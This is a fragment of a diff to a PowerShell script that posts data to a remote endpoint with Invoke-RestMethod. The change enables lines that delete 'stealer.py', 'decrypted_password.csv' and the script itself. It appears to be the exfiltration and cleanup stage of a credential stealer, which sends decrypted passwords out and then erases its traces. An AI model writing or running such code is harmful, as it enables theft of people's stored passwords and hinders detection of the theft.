@@ -41,8 +41,10 @@ $headers = @{
 
 Invoke-RestMethod -Uri $dc -Method Post -Headers $headers -Body $body
 
-#Remove-Item stealer.py -Force
-#Remove-item decrypted_password.csv -Force
-#Remove-Item -Path $MyInvocation.MyCommand.Source
+pause
+
+Remove-Item stealer.py -Force
+Remove-item decrypted_password.csv -Force
+Remove-Item -Path $MyInvocation.MyCommand.Source
 
 pause
